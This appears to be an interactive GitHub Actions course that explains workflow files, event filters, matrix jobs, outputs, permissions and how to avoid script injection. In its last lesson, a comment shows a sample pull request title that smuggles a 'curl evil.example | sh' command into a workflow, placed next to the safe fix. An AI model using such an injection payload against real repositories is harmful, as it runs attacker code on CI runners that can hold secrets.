Lesson 1 of 4

A workflow file, line by line

A workflow is a YAML file in .github/workflows/. It says when to run (on), where (runs-on) and what (steps). This is the smallest useful one.

.github/workflows/hello.yml
name: Hello CIon:  push:    branches: [main]  pull_request:jobs:  test:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v7      - uses: actions/setup-python@v7        with:          python-version: '3.13'      - name: Say hello        run: |          python --version          echo "Commit ${{ github.sha }} on ${{ github.ref_name }}"
What each marked line does and why
  1. Line 1name: Hello CIThe name shown in the Actions tab.
  2. Line 2on:The events that start this workflow.
  3. Line 4branches: [main]Only pushes to main. Pushes to other branches are ignored.
  4. Line 5pull_request:Every pull request, from any branch, to any base branch.
  5. Line 7test:A job id. Use letters, digits, - and _.
  6. Line 8runs-on: ubuntu-latestThe runner image. ubuntu-latest, windows-latest and macos-latest are GitHub hosted.
  7. Line 10- uses: actions/checkout@v7uses runs a ready made action. checkout clones your repository into the runner. Without it the runner has no files.
  8. Line 12with:with passes inputs to the action.
  9. Line 13python-version: '3.13'Quoted, or YAML reads 3.10 as 3.1.
  10. Line 15run: |run executes shell commands. The | keeps several lines.
  11. Line 17echo "Commit ${{ github.sha }} on ${{ github.ref_name }}"${{ }} is an expression. github is a context with facts about the run.

Events and filters: when does it run

The on section decides which events start a run. Filters narrow it down by branch, tag or changed path. Type an event, a branch and the changed files, and the animation tells you whether the workflow runs and which rule decided.

EventStarts whenGood for
pushcommits or tags are pushedCI on main, release on tags
pull_requesta PR is opened, gets new commits (synchronize) or is reopened, by defaultchecking a change before merge. The run tests the merge result of the PR with its base
workflow_dispatchsomeone presses Run workflow, or calls the API or gh workflow runmanual QA runs with inputs
schedulea cron time in UTC, on the default branch onlynightly regression
workflow_runanother workflow finishedchaining a QA workflow after CI
Branch and tag filtersExam favourite
branches: [main, 'release/**'], tags: ['v*']
* matches any characters except /, ** also matches /.
Path filters
paths: ['app/**'], paths-ignore: ['docs/**', '**.md']
Skip the run when only docs changed. Use paths or paths-ignore for one event, not both.
CronExam favourite
- cron: '30 2 * * 1-5'
Minute, hour, day of month, month, day of week. This is 02:30 UTC Monday to Friday.
Common mistake
A workflow added on a feature branch with on: push: branches: [main] does not run for pushes to that feature branch. Beginners often think CI is broken. Add pull_request, open a PR, or push to main.
Remember
Scheduled runs can start late when GitHub is busy, especially at the top of the hour. Pick an odd minute such as 2:30 rather than 0:00.
Lesson 3 of 4

Jobs, needs, if, matrix and outputs

Jobs run in parallel unless one needs another. A matrix runs the same job for every combination of values, for example every operating system with every Python version.

jobs-example.yml
jobs:  test:    strategy:      fail-fast: false      matrix:        os: [ubuntu-latest, windows-latest]        python: ['3.12', '3.13']    runs-on: ${{ matrix.os }}    steps:      - uses: actions/checkout@v7      - uses: actions/setup-python@v7        with:          python-version: ${{ matrix.python }}      - id: ver        run: echo "tag=v$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"  release:    needs: test    if: github.ref == 'refs/heads/main' && github.event_name == 'push'    runs-on: ubuntu-latest    steps:      - run: echo "Releasing"
What each marked line does and why
  1. Line 4fail-fast: falseDefault true: one failing combination cancels the others. false lets every combination finish, which QA usually wants for a full picture.
  2. Line 8runs-on: ${{ matrix.os }}The matrix value chooses the runner.
  3. Line 15run: echo "tag=v$(date +%Y%m%d)" >> "$GITHUB_OUTPUT"A step writes name=value lines to the file in $GITHUB_OUTPUT. Later steps read steps.ver.outputs.tag.
  4. Line 17needs: testrelease waits for every matrix job of test.
  5. Line 18if: github.ref == 'refs/heads/main' && github.event_name == 'push'Run only for pushes to main, never for pull requests.

In the exam
A matrix can produce at most 256 jobs per workflow run. Six operating systems times six Python versions times eight databases is already 288.
Lesson 4 of 4

Permissions, concurrency and safe workflows

Least privilege tokenExam favourite
permissions: contents: read
Every run gets a GITHUB_TOKEN. Set only what the jobs need. Add actions: read to download artifacts from other runs, packages: write to publish packages.
One run per branchExam favourite
concurrency: group: ci-${{ github.ref }} cancel-in-progress: true
A new push cancels the older run on the same branch, saving runner minutes.
Environments
environment: qa on a job
An environment can hold its own secrets and protection rules such as required reviewers before the job starts.
Debug logs
Re-run jobs with debug logging, or secret ACTIONS_STEP_DEBUG set to true
Shows extra output from actions.

Script injection. Text from a pull request title, branch name or issue is controlled by whoever opened it. If you paste it into a run line with ${{ }}, it becomes part of your shell script.

unsafe-and-safe.yml
# Unsafe: a PR titled  x"; curl evil.example | sh; echo "  runs that command- run: echo "Title: ${{ github.event.pull_request.title }}"# Safe: pass it as an environment variable, the shell treats it as data- env:    TITLE: ${{ github.event.pull_request.title }}  run: echo "Title: $TITLE"
What each marked line does and why
  1. Line 2- run: echo "Title: ${{ github.event.pull_request.title }}"The expression is replaced before the shell runs, so quotes in the title end the string.
  2. Line 5TITLE: ${{ github.event.pull_request.title }}An environment variable is never parsed as code.
Common mistake
Pull requests from forks get a read only GITHUB_TOKEN and no repository secrets. Do not switch to pull_request_target to work around this if the job runs code from the pull request, because that event runs with your secrets.
One idea, four depths

A workflow file says when to run, on which machine and which steps. Jobs run side by side unless one needs another.

Events with branch, tag and path filters start runs. Jobs have runs-on, needs, if and strategy.matrix. Steps use actions or run commands and pass data with GITHUB_OUTPUT. Contexts such as github, secrets and matrix fill ${{ }} expressions.

Security comes from least privilege permissions, SHA pinned actions, environment protection rules, never interpolating untrusted text into scripts and keeping fork PRs away from secrets.

Reusable workflows (workflow_call), composite actions and OpenID Connect tokens let large organisations share pipelines and deploy to clouds without long lived secrets, a pattern also recommended by SLSA.
